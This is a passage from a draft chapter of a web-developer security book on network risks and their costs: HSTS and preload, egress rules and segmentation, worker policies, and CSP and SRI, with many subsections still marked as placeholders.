#### HTTP Strict Transport Security (HSTS) {#network-risks-that-solution-causes-tls-downgrade-hsts}

Unless the browsers know about your domain and have it added to their HSTS Preload list, then the connection is still not safe on the very first request, unless your server refuses to serve without TLS, which should be the case.

#### HTTP Strict Transport Security (HSTS) Preload {#network-risks-that-solution-causes-tls-downgrade-hsts-preload}

Ultimately, if you have done you job correctly, you are trusting the browser to honour your decision to not communicate at all unless TLS is supported.

If you make sure your web server only ever responds over HTTPS, including the very first response then the HSTS preload may work for you, just beware that once your domain is in the list, it is only reachable over HTTPS

### Firewall/Router

_Todo_

### Wire Inspecting

_Todo_

### Wi-Fi

_Todo_

### Using Components with Known Vulnerabilities

_Todo_

## 5. SSM Costs and Trade-offs

### Fortress Mentality

Your workers still need to connect to the corporate LAN. So put policies in place to make sure what ever they connect:

* Has a local firewall enabled and configured correctly to cover ports to possibly insecure services
* Must be fully patched
* Anti Virus on systems that need it and rule sets up to date
* Ability to authenticate itself, what ever technique you decide to use

The technical solutions described are costly, but building a motivated and engaged work force is not, it just requires a little thought and action on behalf of those in charge.

The best you can do is care and show you care for your workers. This all comes back to what we discussed in the People chapter of [fascicle 0](https://leanpub.com/holistic-infosec-for-web-developers/) around engaged and well looked after workers.

Your people will be your weakest or your strongest line of defence, it is up to you.

### Lack of Segmentation

Depending on your scenario, threat model and determine what the next lowest hanging fruit is and harden or remove that attack surface and just keep working your way up the tree.

If you can explain why you have tight egress rules, people will usually be accepting.

If you are constrained to use software that insists on changing what port it wants to communicate on, discuss this along with the perils of leaving large port spaces open with those mandating the tool. If you can not have the tool configured to communicate on a specific port and you do not get any traction with changing the tool, at least lock the outbound port space down to specific hosts and protocols.

### Lack of Visibility

_Todo_

#### Insufficient Logging

_Todo_

#### Lack of Network Intrusion Detection Systems (NIDS)

_Todo_

### Spoofing

_Todo_

#### IP

_Todo_

#### ARP (Address Resolution Protocol)

_Todo_

#### DNS

_Todo_

#### Referrer

_Todo_

#### EMail Address

_Todo_

#### Website

_Todo_

### Data Exfiltration, Infiltration leveraging DNS

_Todo_

### Doppelganger Domains


#### Web-sites

_Todo_

#### SMTP

_Todo_

#### SSH

_Todo_

### Wrongfully Trusting the Loading of Untrusted Web Resources

#### Content Security Policy (CSP)

Any countermeasure costs here are fairly trivial.

#### Sub-resource Integrity (SRI)

Any countermeasure costs here are fairly trivial.

### TLS Downgrade

#### HTTP Strict Transport Security (HSTS)

Make sure your server only serves responses over HTTPS.

#### HTTP Strict Transport Security (HSTS) Preload

It may make sense to not add your domain to the preload list, but make sure that resources from your domain are not accessible unless over HTTPS. There are many ways to do this. 

### Firewall/Router

_Todo_

### Wire Inspecting

_Todo_

### Wi-Fi

_Todo_

### Using Components with Known Vulnerabilities

_Todo_

